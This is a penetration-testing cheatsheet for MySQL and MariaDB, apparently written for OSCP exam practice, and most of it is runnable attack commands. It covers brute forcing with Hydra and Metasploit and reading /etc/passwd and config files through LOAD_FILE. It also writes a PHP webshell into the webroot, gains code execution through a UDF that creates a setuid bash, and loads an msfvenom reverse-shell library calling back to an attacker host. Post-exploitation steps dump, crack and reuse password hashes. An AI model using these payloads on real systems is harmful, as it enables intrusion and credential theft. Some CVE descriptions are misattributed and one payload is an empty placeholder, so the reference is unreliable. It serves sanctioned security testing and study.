# MySQL / MariaDB

> Part of [Databases](./README.md) in the [Web Application Testing Cheatsheet](../../README.md).

**Contents:**

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Default and weak credentials](#3-default-and-weak-credentials)
- [4. Known CVEs](#4-known-cves)
- [5. Exploitation](#5-exploitation)
- [6. Post-exploitation](#6-post-exploitation)
- [7. OSCP notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### 1.1 Port and banner

Default port **3306**. Common deviations: 3307, 13306, 33060 (X Protocol).

```bash
# Version + auth plugin via handshake
nmap -sV -p 3306 <TARGET>
nmap -p 3306 --script mysql-info,mysql-enum <TARGET>

# Raw banner
nc -nv <TARGET> 3306
```

Expected output (MySQL 8.0):

```text
3306/tcp open  mysql   MySQL 8.0.32-0ubuntu0.22.04.2
| mysql-info:
|   Protocol: 10
|   Version: 8.0.32-0ubuntu0.22.04.2
|   Thread ID: 5
|   Auth Plugin Name: caching_sha2_password
```

### 1.2 Version to CVE mapping

| Version range | Notable CVEs |
|---------------|--------------|
| MySQL 5.5.x | CVE-2012-2122, CVE-2016-6662 |
| MySQL 5.6.x | CVE-2016-6662, CVE-2016-6663, CVE-2016-6664 |
| MySQL 5.7.x | CVE-2016-6663, CVE-2016-6664, CVE-2019-3822 |
| MySQL 8.0.x | CVE-2023-21980 (auth bypass, 8.0.0-8.0.32) |
| MariaDB 5.5-10.1 | CVE-2016-6662, CVE-2016-6663 |
| MariaDB < 10.2.37 / 10.3.28 / 10.4.18 | CVE-2021-27928 (RCE) |

---

## 2. Enumeration

### 2.1 Unauthenticated

- Version + auth plugin (see 1.1).
- If MySQL 5.5.x: try CVE-2012-2122 (auth bypass, see 5.4).

### 2.2 Authenticated

```sql
-- List databases
SHOW DATABASES;

-- Current user + privileges
SELECT USER(), CURRENT_USER();
SHOW GRANTS FOR CURRENT_USER();

-- Enumerate users (needs mysql.user access)
SELECT user, host, authentication_string FROM mysql.user;

-- Enumerate tables from all schemas
SELECT table_schema, table_name FROM information_schema.tables;

-- Find interesting columns (password, token, secret, key)
SELECT table_schema, table_name, column_name
FROM information_schema.columns
WHERE column_name LIKE '%pass%'
   OR column_name LIKE '%secret%'
   OR column_name LIKE '%token%'
   OR column_name LIKE '%key%';
```

### 2.3 Check FILE privilege (critical for read/write)

```sql
SHOW GRANTS FOR CURRENT_USER();
-- Look for: FILE, SUPER, ALL PRIVILEGES
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).
> The FILE privilege is the gateway to file read/write and often RCE.

Expected output:

```text
+--------------------------------------------------+
| Grants for root@localhost                        |
+--------------------------------------------------+
| GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' |
+--------------------------------------------------+
```

---

## 3. Default and weak credentials

### 3.1 Common defaults

| User | Password | Notes |
|------|----------|-------|
| root | (empty) | Fresh installs, MySQL 5.x |
| root | root | Common in CTFs, Docker images |
| root | toor | Reversed root |
| root | password | Classic weak |
| root | mysql | Debian package default |
| admin | admin | Custom apps |

### 3.2 Brute force

```bash
# Hydra - MySQL module
hydra -l root -P /usr/share/wordlists/rockyou.txt <TARGET> mysql

# nmap NSE
nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=pass.txt <TARGET>

# Metasploit
msfconsole -q -x "use auxiliary/scanner/mysql/mysql_login; set RHOSTS <TARGET>; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; run"
```

Rate limit note: MySQL has no built-in lockout by default, but connection throttling and fail2ban may apply. Use `-t 4` in hydra to avoid flooding.

---

## 4. Known CVEs

| CVE | Affected | Impact | NVD |
|-----|----------|--------|-----|
| CVE-2012-2122 | MySQL 5.1.x, 5.5.x | Auth bypass (repeated auth attempt, timing) | https://nvd.nist.gov/vuln/detail/CVE-2012-2122 |
| CVE-2016-6662 | MySQL <= 5.7.15, MariaDB <= 10.1.17 | RCE via malicious my.cnf | https://nvd.nist.gov/vuln/detail/CVE-2016-6662 |
| CVE-2016-6663 | MySQL <= 5.5.52, 5.6.33, 5.7.15; MariaDB <= 10.1.18 | Race condition to mysql user | https://nvd.nist.gov/vuln/detail/CVE-2016-6663 |
| CVE-2016-6664 | MySQL 5.5.x, 5.6.x, 5.7.x; MariaDB 5.5-10.1 | Privesc mysql to root via error log | https://nvd.nist.gov/vuln/detail/CVE-2016-6664 |
| CVE-2019-3822 | MariaDB 10.1.x, 10.2.x, 10.3.x | Stack overflow in auth | https://nvd.nist.gov/vuln/detail/CVE-2019-3822 |
| CVE-2021-27928 | MariaDB 10.2.37, 10.3.28, 10.4.18 | RCE via wsrep_provider | https://nvd.nist.gov/vuln/detail/CVE-2021-27928 |
| CVE-2023-21980 | MySQL 8.0.0-8.0.32 | Auth bypass via crafted packet | https://nvd.nist.gov/vuln/detail/CVE-2023-21980 |

---

## 5. Exploitation

### 5.1 File read (LOAD_FILE)

Requires: `FILE` privilege, `secure_file_priv` empty or pointing to readable path.

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('C:\\\\Windows\\\\win.ini');
```

Check `secure_file_priv`:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

- Empty value: can read/write anywhere.
- Path value: restricted to that directory.
- NULL: file operations disabled.

### 5.2 File write (INTO OUTFILE / DUMPFILE)

Requires: `FILE` privilege + `secure_file_priv` allows the target dir + write permissions.

```sql
-- Webshell to webroot
SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- DUMPFILE (no newlines - better for binary)
SELECT 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e INTO DUMPFILE '/var/www/html/shell.php';
```

Expected output:

```text
Query OK, 1 row affected (0.00 sec)
```

Then: `curl 'http://<TARGET>/shell.php?cmd=id'`

### 5.3 UDF RCE (Linux)

Use `raptor_udf2` or `mysql-udf`:

```bash
# Search for raptor_udf2 or download
searchsploit raptor_udf2
# Compile the .so
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```sql
-- Write the .so
SELECT 0x... INTO DUMPFILE '/tmp/raptor_udf2.so';
-- Create function
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
-- Execute
SELECT do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
```

### 5.4 Auth bypass - CVE-2012-2122

Affects MySQL 5.1.x, 5.5.x. Repeated auth attempts with wrong password eventually succeed (1/256 chance per attempt).

```bash
for i in $(seq 1 1000); do
  mysql -h <TARGET> -u root --password=wrongpass -e 'SELECT 1;' 2>/dev/null && break
done
```

Or Metasploit: `use auxiliary/scanner/mysql/mysql_authbypass_hashdump`

### 5.5 my.cnf RCE - CVE-2016-6662

If you have `FILE` privilege and MySQL runs as root, write a malicious my.cnf:

```sql
SELECT '''' INTO OUTFILE '/var/lib/mysql/my.cnf';
```

(Full payload in references - PayloadsAllTheThings.)

### 5.6 MariaDB wsrep RCE - CVE-2021-27928

```bash
# Create malicious .so
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf-so -o evil.so
# Upload to target, then:
```

```sql
SET GLOBAL wsrep_provider='/path/to/evil.so';
```

---

## 6. Post-exploitation

### 6.1 Dump all password hashes

```sql
SELECT user, host, authentication_string FROM mysql.user;
```

MySQL 5.7+ / 8.0: `authentication_string` column.
MySQL 5.6-: `Password` column (older format).

### 6.2 Crack MySQL hashes

Hashcat modes:
- `-m 200` - MySQL323 (old, < 4.1)
- `-m 300` - MySQL4.1/MySQL5 ($A$... format)

```bash
hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt
```

### 6.3 Application config files to read

Common paths with cleartext DB creds:

- `/var/www/html/wp-config.php` (WordPress)
- `/var/www/html/config.php` (generic PHP)
- `/var/www/html/.env` (Laravel, Symfony)
- `/opt/app/application.properties` (Spring Boot)
- `/etc/mysql/debian.cnf` (Debian package)

### 6.4 Reuse credentials

Password hashes from `mysql.user` + app configs often reused for SSH.

```bash
ssh <USER>@<TARGET>
```

---

## 7. OSCP notes

> [!IMPORTANT]
> OSCP report: take a screenshot of the initial connection that proves credential access (mysql -h ... -u ... -p ... + SHOW DATABASES output).

> [!IMPORTANT]
> OSCP report: screenshot the moment you achieve RCE (webshell response, UDF execution, or CVE exploit output).

> [!IMPORTANT]
> OSCP report: screenshot any file read of `/etc/shadow` or `config.php` that yields credentials used for lateral movement.

---

## 8. References

- MySQL official docs: https://dev.mysql.com/doc/
- MariaDB official docs: https://mariadb.com/kb/en/documentation/
- NVD MySQL: https://nvd.nist.gov/products/cpe/detail/3A4A5E6F-... (search: cpe:2.3:a:oracle:mysql)
- PayloadsAllTheThings - MySQL: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
- HackTricks - MySQL: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
- CVE-2012-2122: https://nvd.nist.gov/vuln/detail/CVE-2012-2122
- CVE-2016-6662: https://nvd.nist.gov/vuln/detail/CVE-2016-6662
- CVE-2016-6663: https://nvd.nist.gov/vuln/detail/CVE-2016-6663
- CVE-2016-6664: https://nvd.nist.gov/vuln/detail/CVE-2016-6664
- CVE-2019-3822: https://nvd.nist.gov/vuln/detail/CVE-2019-3822
- CVE-2021-27928: https://nvd.nist.gov/vuln/detail/CVE-2021-27928
- CVE-2023-21980: https://nvd.nist.gov/vuln/detail/CVE-2023-21980

---